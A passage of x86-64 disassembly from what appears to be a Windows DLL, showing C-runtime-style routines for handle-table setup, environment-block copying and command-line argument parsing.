   18000338d:	41 8b fe             	mov    %r14d,%edi
   180003390:	85 db                	test   %ebx,%ebx
   180003392:	7e 7c                	jle    0x180003410
   180003394:	49 83 3c 24 ff       	cmpq   $0xffffffffffffffff,(%r12)
   180003399:	74 68                	je     0x180003403
   18000339b:	49 83 3c 24 fe       	cmpq   $0xfffffffffffffffe,(%r12)
   1800033a0:	74 61                	je     0x180003403
   1800033a2:	41 f6 45 00 01       	testb  $0x1,0x0(%r13)
   1800033a7:	74 5a                	je     0x180003403
   1800033a9:	41 f6 45 00 08       	testb  $0x8,0x0(%r13)
   1800033ae:	75 0e                	jne    0x1800033be
   1800033b0:	49 8b 0c 24          	mov    (%r12),%rcx
   1800033b4:	ff 15 5e 5d 00 00    	call   *0x5d5e(%rip)        # 0x180009118
   1800033ba:	85 c0                	test   %eax,%eax
   1800033bc:	74 45                	je     0x180003403
   1800033be:	48 63 ef             	movslq %edi,%rbp
   1800033c1:	48 8d 0d 58 c0 00 00 	lea    0xc058(%rip),%rcx        # 0x18000f420
   1800033c8:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1800033cd:	48 8b c5             	mov    %rbp,%rax
   1800033d0:	83 e5 1f             	and    $0x1f,%ebp
   1800033d3:	48 c1 f8 05          	sar    $0x5,%rax
   1800033d7:	48 6b ed 58          	imul   $0x58,%rbp,%rbp
   1800033db:	48 03 2c c1          	add    (%rcx,%rax,8),%rbp
   1800033df:	49 8b 04 24          	mov    (%r12),%rax
   1800033e3:	48 89 45 00          	mov    %rax,0x0(%rbp)
   1800033e7:	41 8a 45 00          	mov    0x0(%r13),%al
   1800033eb:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1800033ef:	88 45 08             	mov    %al,0x8(%rbp)
   1800033f2:	ff 15 18 5d 00 00    	call   *0x5d18(%rip)        # 0x180009110
   1800033f8:	85 c0                	test   %eax,%eax
   1800033fa:	0f 84 69 fe ff ff    	je     0x180003269
   180003400:	ff 45 0c             	incl   0xc(%rbp)
   180003403:	ff c7                	inc    %edi
   180003405:	49 ff c5             	inc    %r13
   180003408:	49 83 c4 08          	add    $0x8,%r12
   18000340c:	3b fb                	cmp    %ebx,%edi
   18000340e:	7c 84                	jl     0x180003394
   180003410:	45 8b e6             	mov    %r14d,%r12d
   180003413:	49 8b de             	mov    %r14,%rbx
   180003416:	48 8b 3d 03 c0 00 00 	mov    0xc003(%rip),%rdi        # 0x18000f420
   18000341d:	48 83 3c 3b ff       	cmpq   $0xffffffffffffffff,(%rbx,%rdi,1)
   180003422:	74 11                	je     0x180003435
   180003424:	48 83 3c 3b fe       	cmpq   $0xfffffffffffffffe,(%rbx,%rdi,1)
   180003429:	74 0a                	je     0x180003435
   18000342b:	80 4c 3b 08 80       	orb    $0x80,0x8(%rbx,%rdi,1)
   180003430:	e9 85 00 00 00       	jmp    0x1800034ba
   180003435:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   18000343a:	c6 44 3b 08 81       	movb   $0x81,0x8(%rbx,%rdi,1)
   18000343f:	f7 d8                	neg    %eax
   180003441:	b8 f6 ff ff ff       	mov    $0xfffffff6,%eax
   180003446:	1b c9                	sbb    %ecx,%ecx
   180003448:	83 c1 f5             	add    $0xfffffff5,%ecx
   18000344b:	45 85 e4             	test   %r12d,%r12d
   18000344e:	0f 44 c8             	cmove  %eax,%ecx
   180003451:	ff 15 b1 5c 00 00    	call   *0x5cb1(%rip)        # 0x180009108
   180003457:	48 8b e8             	mov    %rax,%rbp
   18000345a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000345e:	74 4d                	je     0x1800034ad
   180003460:	48 85 c0             	test   %rax,%rax
   180003463:	74 48                	je     0x1800034ad
   180003465:	48 8b c8             	mov    %rax,%rcx
   180003468:	ff 15 aa 5c 00 00    	call   *0x5caa(%rip)        # 0x180009118
   18000346e:	85 c0                	test   %eax,%eax
   180003470:	74 3b                	je     0x1800034ad
   180003472:	0f b6 c0             	movzbl %al,%eax
   180003475:	48 89 2c 3b          	mov    %rbp,(%rbx,%rdi,1)
   180003479:	83 f8 02             	cmp    $0x2,%eax
   18000347c:	75 07                	jne    0x180003485
   18000347e:	80 4c 3b 08 40       	orb    $0x40,0x8(%rbx,%rdi,1)
   180003483:	eb 0a                	jmp    0x18000348f
   180003485:	83 f8 03             	cmp    $0x3,%eax
   180003488:	75 05                	jne    0x18000348f
   18000348a:	80 4c 3b 08 08       	orb    $0x8,0x8(%rbx,%rdi,1)
   18000348f:	48 8d 4c 3b 10       	lea    0x10(%rbx,%rdi,1),%rcx
   180003494:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   180003499:	ff 15 71 5c 00 00    	call   *0x5c71(%rip)        # 0x180009110
   18000349f:	85 c0                	test   %eax,%eax
   1800034a1:	0f 84 c2 fd ff ff    	je     0x180003269
   1800034a7:	ff 44 3b 0c          	incl   0xc(%rbx,%rdi,1)
   1800034ab:	eb 0d                	jmp    0x1800034ba
   1800034ad:	80 4c 3b 08 40       	orb    $0x40,0x8(%rbx,%rdi,1)
   1800034b2:	48 c7 04 3b fe ff ff 	movq   $0xfffffffffffffffe,(%rbx,%rdi,1)
   1800034b9:	ff 
   1800034ba:	48 83 c3 58          	add    $0x58,%rbx
   1800034be:	41 ff c4             	inc    %r12d
   1800034c1:	48 81 fb 08 01 00 00 	cmp    $0x108,%rbx
   1800034c8:	0f 8c 48 ff ff ff    	jl     0x180003416
   1800034ce:	8b 0d 30 bf 00 00    	mov    0xbf30(%rip),%ecx        # 0x18000f404
   1800034d4:	ff 15 26 5c 00 00    	call   *0x5c26(%rip)        # 0x180009100
   1800034da:	33 c0                	xor    %eax,%eax
   1800034dc:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1800034e3:	00 
   1800034e4:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1800034e8:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   1800034ec:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1800034f0:	49 8b e3             	mov    %r11,%rsp
   1800034f3:	41 5e                	pop    %r14
   1800034f5:	41 5d                	pop    %r13
   1800034f7:	41 5c                	pop    %r12
   1800034f9:	c3                   	ret
   1800034fa:	cc                   	int3
   1800034fb:	cc                   	int3
   1800034fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003501:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003506:	57                   	push   %rdi
   180003507:	48 83 ec 20          	sub    $0x20,%rsp
   18000350b:	48 8d 1d 0e bf 00 00 	lea    0xbf0e(%rip),%rbx        # 0x18000f420
   180003512:	be 40 00 00 00       	mov    $0x40,%esi
   180003517:	48 8b 3b             	mov    (%rbx),%rdi
   18000351a:	48 85 ff             	test   %rdi,%rdi
   18000351d:	74 37                	je     0x180003556
   18000351f:	48 8d 87 00 0b 00 00 	lea    0xb00(%rdi),%rax
   180003526:	eb 1d                	jmp    0x180003545
   180003528:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   18000352c:	74 0a                	je     0x180003538
   18000352e:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   180003532:	ff 15 f0 5b 00 00    	call   *0x5bf0(%rip)        # 0x180009128
   180003538:	48 8b 03             	mov    (%rbx),%rax
   18000353b:	48 83 c7 58          	add    $0x58,%rdi
   18000353f:	48 05 00 0b 00 00    	add    $0xb00,%rax
   180003545:	48 3b f8             	cmp    %rax,%rdi
   180003548:	72 de                	jb     0x180003528
   18000354a:	48 8b 0b             	mov    (%rbx),%rcx
   18000354d:	e8 66 f7 ff ff       	call   0x180002cb8
   180003552:	48 83 23 00          	andq   $0x0,(%rbx)
   180003556:	48 83 c3 08          	add    $0x8,%rbx
   18000355a:	48 ff ce             	dec    %rsi
   18000355d:	75 b8                	jne    0x180003517
   18000355f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003564:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180003569:	48 83 c4 20          	add    $0x20,%rsp
   18000356d:	5f                   	pop    %rdi
   18000356e:	c3                   	ret
   18000356f:	cc                   	int3
   180003570:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003575:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000357a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000357f:	57                   	push   %rdi
   180003580:	48 83 ec 30          	sub    $0x30,%rsp
   180003584:	83 3d ad c0 00 00 00 	cmpl   $0x0,0xc0ad(%rip)        # 0x18000f638
   18000358b:	75 05                	jne    0x180003592
   18000358d:	e8 16 1d 00 00       	call   0x1800052a8
   180003592:	48 8b 1d 1f 9e 00 00 	mov    0x9e1f(%rip),%rbx        # 0x18000d3b8
   180003599:	33 ff                	xor    %edi,%edi
   18000359b:	48 85 db             	test   %rbx,%rbx
   18000359e:	75 1b                	jne    0x1800035bb
   1800035a0:	83 c8 ff             	or     $0xffffffff,%eax
   1800035a3:	e9 b4 00 00 00       	jmp    0x18000365c
   1800035a8:	3c 3d                	cmp    $0x3d,%al
   1800035aa:	74 02                	je     0x1800035ae
   1800035ac:	ff c7                	inc    %edi
   1800035ae:	48 8b cb             	mov    %rbx,%rcx
   1800035b1:	e8 ea 23 00 00       	call   0x1800059a0
   1800035b6:	48 8d 5c 03 01       	lea    0x1(%rbx,%rax,1),%rbx
   1800035bb:	8a 03                	mov    (%rbx),%al
   1800035bd:	84 c0                	test   %al,%al
   1800035bf:	75 e7                	jne    0x1800035a8
   1800035c1:	8d 47 01             	lea    0x1(%rdi),%eax
   1800035c4:	ba 08 00 00 00       	mov    $0x8,%edx
   1800035c9:	48 63 c8             	movslq %eax,%rcx
   1800035cc:	e8 a7 f7 ff ff       	call   0x180002d78
   1800035d1:	48 8b f8             	mov    %rax,%rdi
   1800035d4:	48 89 05 1d 9e 00 00 	mov    %rax,0x9e1d(%rip)        # 0x18000d3f8
   1800035db:	48 85 c0             	test   %rax,%rax
   1800035de:	74 c0                	je     0x1800035a0
   1800035e0:	48 8b 1d d1 9d 00 00 	mov    0x9dd1(%rip),%rbx        # 0x18000d3b8
   1800035e7:	80 3b 00             	cmpb   $0x0,(%rbx)
   1800035ea:	74 50                	je     0x18000363c
   1800035ec:	48 8b cb             	mov    %rbx,%rcx
   1800035ef:	e8 ac 23 00 00       	call   0x1800059a0
   1800035f4:	80 3b 3d             	cmpb   $0x3d,(%rbx)
   1800035f7:	8d 70 01             	lea    0x1(%rax),%esi
   1800035fa:	74 2e                	je     0x18000362a
   1800035fc:	48 63 ee             	movslq %esi,%rbp
   1800035ff:	ba 01 00 00 00       	mov    $0x1,%edx
   180003604:	48 8b cd             	mov    %rbp,%rcx
   180003607:	e8 6c f7 ff ff       	call   0x180002d78
   18000360c:	48 89 07             	mov    %rax,(%rdi)
   18000360f:	48 85 c0             	test   %rax,%rax
   180003612:	74 73                	je     0x180003687
   180003614:	4c 8b c3             	mov    %rbx,%r8
   180003617:	48 8b d5             	mov    %rbp,%rdx
   18000361a:	48 8b c8             	mov    %rax,%rcx
   18000361d:	e8 56 31 00 00       	call   0x180006778
   180003622:	85 c0                	test   %eax,%eax
   180003624:	75 4b                	jne    0x180003671
   180003626:	48 83 c7 08          	add    $0x8,%rdi
   18000362a:	48 63 c6             	movslq %esi,%rax
   18000362d:	48 03 d8             	add    %rax,%rbx
   180003630:	80 3b 00             	cmpb   $0x0,(%rbx)
   180003633:	75 b7                	jne    0x1800035ec
   180003635:	48 8b 1d 7c 9d 00 00 	mov    0x9d7c(%rip),%rbx        # 0x18000d3b8
   18000363c:	48 8b cb             	mov    %rbx,%rcx
   18000363f:	e8 74 f6 ff ff       	call   0x180002cb8
   180003644:	48 83 25 6c 9d 00 00 	andq   $0x0,0x9d6c(%rip)        # 0x18000d3b8
   18000364b:	00 
   18000364c:	48 83 27 00          	andq   $0x0,(%rdi)
   180003650:	c7 05 c6 bf 00 00 01 	movl   $0x1,0xbfc6(%rip)        # 0x18000f620
   180003657:	00 00 00 
   18000365a:	33 c0                	xor    %eax,%eax
   18000365c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003661:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180003666:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   18000366b:	48 83 c4 30          	add    $0x30,%rsp
   18000366f:	5f                   	pop    %rdi
   180003670:	c3                   	ret
   180003671:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180003677:	45 33 c9             	xor    %r9d,%r9d
   18000367a:	45 33 c0             	xor    %r8d,%r8d
   18000367d:	33 d2                	xor    %edx,%edx
   18000367f:	33 c9                	xor    %ecx,%ecx
   180003681:	e8 0e ef ff ff       	call   0x180002594
   180003686:	cc                   	int3
   180003687:	48 8b 0d 6a 9d 00 00 	mov    0x9d6a(%rip),%rcx        # 0x18000d3f8
   18000368e:	e8 25 f6 ff ff       	call   0x180002cb8
   180003693:	48 83 25 5d 9d 00 00 	andq   $0x0,0x9d5d(%rip)        # 0x18000d3f8
   18000369a:	00 
   18000369b:	e9 00 ff ff ff       	jmp    0x1800035a0
   1800036a0:	48 8b c4             	mov    %rsp,%rax
   1800036a3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800036a7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1800036ab:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800036af:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800036b3:	41 54                	push   %r12
   1800036b5:	41 55                	push   %r13
   1800036b7:	41 56                	push   %r14
   1800036b9:	48 83 ec 20          	sub    $0x20,%rsp
   1800036bd:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   1800036c2:	4d 8b f1             	mov    %r9,%r14
   1800036c5:	49 8b f8             	mov    %r8,%rdi
   1800036c8:	41 83 65 00 00       	andl   $0x0,0x0(%r13)
   1800036cd:	4c 8b e2             	mov    %rdx,%r12
   1800036d0:	48 8b d9             	mov    %rcx,%rbx
   1800036d3:	41 c7 01 01 00 00 00 	movl   $0x1,(%r9)
   1800036da:	48 85 d2             	test   %rdx,%rdx
   1800036dd:	74 07                	je     0x1800036e6
   1800036df:	4c 89 02             	mov    %r8,(%rdx)
   1800036e2:	49 83 c4 08          	add    $0x8,%r12
   1800036e6:	33 ed                	xor    %ebp,%ebp
   1800036e8:	80 3b 22             	cmpb   $0x22,(%rbx)
   1800036eb:	75 11                	jne    0x1800036fe
   1800036ed:	33 c0                	xor    %eax,%eax
   1800036ef:	85 ed                	test   %ebp,%ebp
   1800036f1:	40 b6 22             	mov    $0x22,%sil
   1800036f4:	0f 94 c0             	sete   %al
   1800036f7:	48 ff c3             	inc    %rbx
   1800036fa:	8b e8                	mov    %eax,%ebp
   1800036fc:	eb 39                	jmp    0x180003737
   1800036fe:	41 ff 45 00          	incl   0x0(%r13)
   180003702:	48 85 ff             	test   %rdi,%rdi
   180003705:	74 07                	je     0x18000370e
   180003707:	8a 03                	mov    (%rbx),%al
   180003709:	88 07                	mov    %al,(%rdi)
   18000370b:	48 ff c7             	inc    %rdi
   18000370e:	0f b6 33             	movzbl (%rbx),%esi
   180003711:	48 ff c3             	inc    %rbx
   180003714:	8b ce                	mov    %esi,%ecx
   180003716:	e8 3d 31 00 00       	call   0x180006858
   18000371b:	85 c0                	test   %eax,%eax
   18000371d:	74 13                	je     0x180003732
   18000371f:	41 ff 45 00          	incl   0x0(%r13)
   180003723:	48 85 ff             	test   %rdi,%rdi
   180003726:	74 07                	je     0x18000372f
   180003728:	8a 03                	mov    (%rbx),%al
   18000372a:	88 07                	mov    %al,(%rdi)
   18000372c:	48 ff c7             	inc    %rdi
   18000372f:	48 ff c3             	inc    %rbx
   180003732:	40 84 f6             	test   %sil,%sil
   180003735:	74 1b                	je     0x180003752
   180003737:	85 ed                	test   %ebp,%ebp
   180003739:	75 ad                	jne    0x1800036e8
   18000373b:	40 80 fe 20          	cmp    $0x20,%sil
   18000373f:	74 06                	je     0x180003747
   180003741:	40 80 fe 09          	cmp    $0x9,%sil
   180003745:	75 a1                	jne    0x1800036e8
   180003747:	48 85 ff             	test   %rdi,%rdi
   18000374a:	74 09                	je     0x180003755
   18000374c:	c6 47 ff 00          	movb   $0x0,-0x1(%rdi)
   180003750:	eb 03                	jmp    0x180003755
   180003752:	48 ff cb             	dec    %rbx
   180003755:	33 f6                	xor    %esi,%esi
   180003757:	80 3b 00             	cmpb   $0x0,(%rbx)
   18000375a:	0f 84 e3 00 00 00    	je     0x180003843
   180003760:	80 3b 20             	cmpb   $0x20,(%rbx)
   180003763:	74 05                	je     0x18000376a
   180003765:	80 3b 09             	cmpb   $0x9,(%rbx)
   180003768:	75 05                	jne    0x18000376f
   18000376a:	48 ff c3             	inc    %rbx
   18000376d:	eb f1                	jmp    0x180003760
   18000376f:	80 3b 00             	cmpb   $0x0,(%rbx)
   180003772:	0f 84 cb 00 00 00    	je     0x180003843
   180003778:	4d 85 e4             	test   %r12,%r12
   18000377b:	74 08                	je     0x180003785
   18000377d:	49 89 3c 24          	mov    %rdi,(%r12)
   180003781:	49 83 c4 08          	add    $0x8,%r12
   180003785:	41 ff 06             	incl   (%r14)
   180003788:	ba 01 00 00 00       	mov    $0x1,%edx
   18000378d:	33 c9                	xor    %ecx,%ecx
   18000378f:	eb 05                	jmp    0x180003796
   180003791:	48 ff c3             	inc    %rbx
   180003794:	ff c1                	inc    %ecx
   180003796:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   180003799:	74 f6                	je     0x180003791
   18000379b:	80 3b 22             	cmpb   $0x22,(%rbx)
   18000379e:	75 36                	jne    0x1800037d6
   1800037a0:	84 ca                	test   %cl,%dl
   1800037a2:	75 1d                	jne    0x1800037c1
   1800037a4:	85 f6                	test   %esi,%esi
   1800037a6:	74 0e                	je     0x1800037b6
   1800037a8:	48 8d 43 01          	lea    0x1(%rbx),%rax
   1800037ac:	80 38 22             	cmpb   $0x22,(%rax)
   1800037af:	75 05                	jne    0x1800037b6
   1800037b1:	48 8b d8             	mov    %rax,%rbx
   1800037b4:	eb 0b                	jmp    0x1800037c1
   1800037b6:	33 c0                	xor    %eax,%eax
   1800037b8:	33 d2                	xor    %edx,%edx
   1800037ba:	85 f6                	test   %esi,%esi
   1800037bc:	0f 94 c0             	sete   %al
   1800037bf:	8b f0                	mov    %eax,%esi
   1800037c1:	d1 e9                	shr    $1,%ecx
   1800037c3:	eb 11                	jmp    0x1800037d6
   1800037c5:	ff c9                	dec    %ecx
   1800037c7:	48 85 ff             	test   %rdi,%rdi
   1800037ca:	74 06                	je     0x1800037d2
   1800037cc:	c6 07 5c             	movb   $0x5c,(%rdi)
   1800037cf:	48 ff c7             	inc    %rdi
   1800037d2:	41 ff 45 00          	incl   0x0(%r13)
   1800037d6:	85 c9                	test   %ecx,%ecx
   1800037d8:	75 eb                	jne    0x1800037c5
   1800037da:	8a 03                	mov    (%rbx),%al
   1800037dc:	84 c0                	test   %al,%al
   1800037de:	74 4f                	je     0x18000382f
   1800037e0:	85 f6                	test   %esi,%esi
   1800037e2:	75 08                	jne    0x1800037ec
   1800037e4:	3c 20                	cmp    $0x20,%al
   1800037e6:	74 47                	je     0x18000382f
   1800037e8:	3c 09                	cmp    $0x9,%al
   1800037ea:	74 43                	je     0x18000382f
   1800037ec:	85 d2                	test   %edx,%edx
   1800037ee:	74 37                	je     0x180003827
   1800037f0:	0f be c8             	movsbl %al,%ecx
   1800037f3:	e8 60 30 00 00       	call   0x180006858
   1800037f8:	48 85 ff             	test   %rdi,%rdi
   1800037fb:	74 1b                	je     0x180003818
   1800037fd:	85 c0                	test   %eax,%eax
   1800037ff:	74 0e                	je     0x18000380f
   180003801:	8a 03                	mov    (%rbx),%al
   180003803:	48 ff c3             	inc    %rbx
   180003806:	88 07                	mov    %al,(%rdi)
   180003808:	48 ff c7             	inc    %rdi
   18000380b:	41 ff 45 00          	incl   0x0(%r13)
   18000380f:	8a 03                	mov    (%rbx),%al
   180003811:	88 07                	mov    %al,(%rdi)
   180003813:	48 ff c7             	inc    %rdi
   180003816:	eb 0b                	jmp    0x180003823
   180003818:	85 c0                	test   %eax,%eax
   18000381a:	74 07                	je     0x180003823
   18000381c:	48 ff c3             	inc    %rbx
   18000381f:	41 ff 45 00          	incl   0x0(%r13)
   180003823:	41 ff 45 00          	incl   0x0(%r13)
   180003827:	48 ff c3             	inc    %rbx
   18000382a:	e9 59 ff ff ff       	jmp    0x180003788
   18000382f:	48 85 ff             	test   %rdi,%rdi
   180003832:	74 06                	je     0x18000383a
   180003834:	c6 07 00             	movb   $0x0,(%rdi)
   180003837:	48 ff c7             	inc    %rdi
   18000383a:	41 ff 45 00          	incl   0x0(%r13)
   18000383e:	e9 14 ff ff ff       	jmp    0x180003757
   180003843:	4d 85 e4             	test   %r12,%r12
   180003846:	74 05                	je     0x18000384d
   180003848:	49 83 24 24 00       	andq   $0x0,(%r12)
   18000384d:	41 ff 06             	incl   (%r14)
   180003850:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003855:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   18000385a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   18000385f:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   180003864:	48 83 c4 20          	add    $0x20,%rsp
   180003868:	41 5e                	pop    %r14
   18000386a:	41 5d                	pop    %r13
   18000386c:	41 5c                	pop    %r12
   18000386e:	c3                   	ret
   18000386f:	cc                   	int3
   180003870:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180003875:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000387a:	57                   	push   %rdi
   18000387b:	48 83 ec 30          	sub    $0x30,%rsp
   18000387f:	83 3d b2 bd 00 00 00 	cmpl   $0x0,0xbdb2(%rip)        # 0x18000f638
   180003886:	75 05                	jne    0x18000388d
   180003888:	e8 1b 1a 00 00       	call   0x1800052a8
   18000388d:	48 8d 3d ac 9b 00 00 	lea    0x9bac(%rip),%rdi        # 0x18000d440
   180003894:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   18000389a:	33 c9                	xor    %ecx,%ecx
   18000389c:	48 8b d7             	mov    %rdi,%rdx
   18000389f:	c6 05 9e 9c 00 00 00 	movb   $0x0,0x9c9e(%rip)        # 0x18000d544
   1800038a6:	ff 15 84 58 00 00    	call   *0x5884(%rip)        # 0x180009130
   1800038ac:	48 8b 1d a5 bd 00 00 	mov    0xbda5(%rip),%rbx        # 0x18000f658
   1800038b3:	48 89 3d 5e 9b 00 00 	mov    %rdi,0x9b5e(%rip)        # 0x18000d418
   1800038ba:	48 85 db             	test   %rbx,%rbx
   1800038bd:	74 05                	je     0x1800038c4
   1800038bf:	80 3b 00             	cmpb   $0x0,(%rbx)
   1800038c2:	75 03                	jne    0x1800038c7
   1800038c4:	48 8b df             	mov    %rdi,%rbx
   1800038c7:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1800038cc:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800038d1:	45 33 c0             	xor    %r8d,%r8d
   1800038d4:	33 d2                	xor    %edx,%edx
   1800038d6:	48 8b cb             	mov    %rbx,%rcx
   1800038d9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800038de:	e8 bd fd ff ff       	call   0x1800036a0
   1800038e3:	48 63 74 24 40       	movslq 0x40(%rsp),%rsi
   1800038e8:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   1800038ef:	ff ff 1f 
   1800038f2:	48 3b f1             	cmp    %rcx,%rsi
   1800038f5:	73 5c                	jae    0x180003953
   1800038f7:	48 63 4c 24 48       	movslq 0x48(%rsp),%rcx
   1800038fc:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   180003900:	73 51                	jae    0x180003953
   180003902:	48 8d 14 f1          	lea    (%rcx,%rsi,8),%rdx
   180003906:	48 3b d1             	cmp    %rcx,%rdx
   180003909:	72 48                	jb     0x180003953
   18000390b:	48 8b ca             	mov    %rdx,%rcx
   18000390e:	e8 e5 f3 ff ff       	call   0x180002cf8
   180003913:	48 8b f8             	mov    %rax,%rdi
   180003916:	48 85 c0             	test   %rax,%rax
   180003919:	74 38                	je     0x180003953
   18000391b:	4c 8d 04 f0          	lea    (%rax,%rsi,8),%r8
   18000391f:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   180003924:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180003929:	48 8b d7             	mov    %rdi,%rdx
   18000392c:	48 8b cb             	mov    %rbx,%rcx
   18000392f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003934:	e8 67 fd ff ff       	call   0x1800036a0
   180003939:	44 8b 5c 24 40       	mov    0x40(%rsp),%r11d
   18000393e:	48 89 3d a3 9a 00 00 	mov    %rdi,0x9aa3(%rip)        # 0x18000d3e8
   180003945:	41 ff cb             	dec    %r11d
   180003948:	33 c0                	xor    %eax,%eax
   18000394a:	44 89 1d 93 9a 00 00 	mov    %r11d,0x9a93(%rip)        # 0x18000d3e4
   180003951:	eb 03                	jmp    0x180003956
   180003953:	83 c8 ff             	or     $0xffffffff,%eax
   180003956:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000395b:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180003960:	48 83 c4 30          	add    $0x30,%rsp
   180003964:	5f                   	pop    %rdi
   180003965:	c3                   	ret
   180003966:	cc                   	int3
   180003967:	cc                   	int3
   180003968:	48 8b c4             	mov    %rsp,%rax
   18000396b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000396f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180003973:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180003977:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000397b:	41 54                	push   %r12
   18000397d:	48 83 ec 40          	sub    $0x40,%rsp
   180003981:	ff 15 c1 57 00 00    	call   *0x57c1(%rip)        # 0x180009148
   180003987:	45 33 e4             	xor    %r12d,%r12d
   18000398a:	48 8b f8             	mov    %rax,%rdi
   18000398d:	48 85 c0             	test   %rax,%rax
   180003990:	0f 84 a9 00 00 00    	je     0x180003a3f
   180003996:	48 8b d8             	mov    %rax,%rbx
   180003999:	66 44 39 20          	cmp    %r12w,(%rax)
   18000399d:	74 14                	je     0x1800039b3
   18000399f:	48 83 c3 02          	add    $0x2,%rbx
   1800039a3:	66 44 39 23          	cmp    %r12w,(%rbx)
   1800039a7:	75 f6                	jne    0x18000399f
   1800039a9:	48 83 c3 02          	add    $0x2,%rbx
   1800039ad:	66 44 39 23          	cmp    %r12w,(%rbx)
   1800039b1:	75 ec                	jne    0x18000399f
   1800039b3:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   1800039b8:	48 2b d8             	sub    %rax,%rbx
   1800039bb:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   1800039c0:	48 d1 fb             	sar    $1,%rbx
   1800039c3:	4c 8b c0             	mov    %rax,%r8
   1800039c6:	33 d2                	xor    %edx,%edx
   1800039c8:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   1800039cc:	33 c9                	xor    %ecx,%ecx
   1800039ce:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   1800039d3:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1800039d8:	ff 15 62 57 00 00    	call   *0x5762(%rip)        # 0x180009140
   1800039de:	48 63 e8             	movslq %eax,%rbp
   1800039e1:	85 c0                	test   %eax,%eax
   1800039e3:	74 51                	je     0x180003a36
   1800039e5:	48 8b cd             	mov    %rbp,%rcx
   1800039e8:	e8 0b f3 ff ff       	call   0x180002cf8
   1800039ed:	48 8b f0             	mov    %rax,%rsi
   1800039f0:	48 85 c0             	test   %rax,%rax
   1800039f3:	74 41                	je     0x180003a36
   1800039f5:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   1800039fa:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   1800039ff:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   180003a03:	4c 8b c7             	mov    %rdi,%r8
   180003a06:	33 d2                	xor    %edx,%edx
   180003a08:	33 c9                	xor    %ecx,%ecx
   180003a0a:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   180003a0e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003a13:	ff 15 27 57 00 00    	call   *0x5727(%rip)        # 0x180009140
   180003a19:	85 c0                	test   %eax,%eax
   180003a1b:	75 0b                	jne    0x180003a28
   180003a1d:	48 8b ce             	mov    %rsi,%rcx
   180003a20:	e8 93 f2 ff ff       	call   0x180002cb8
   180003a25:	49 8b f4             	mov    %r12,%rsi
   180003a28:	48 8b cf             	mov    %rdi,%rcx
   180003a2b:	ff 15 07 57 00 00    	call   *0x5707(%rip)        # 0x180009138
   180003a31:	48 8b c6             	mov    %rsi,%rax
   180003a34:	eb 0b                	jmp    0x180003a41
   180003a36:	48 8b cf             	mov    %rdi,%rcx
   180003a39:	ff 15 f9 56 00 00    	call   *0x56f9(%rip)        # 0x180009138
   180003a3f:	33 c0                	xor    %eax,%eax
   180003a41:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180003a46:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180003a4b:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180003a50:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   180003a55:	48 83 c4 40          	add    $0x40,%rsp
   180003a59:	41 5c                	pop    %r12
   180003a5b:	c3                   	ret
   180003a5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003a61:	57                   	push   %rdi
   180003a62:	48 83 ec 20          	sub    $0x20,%rsp
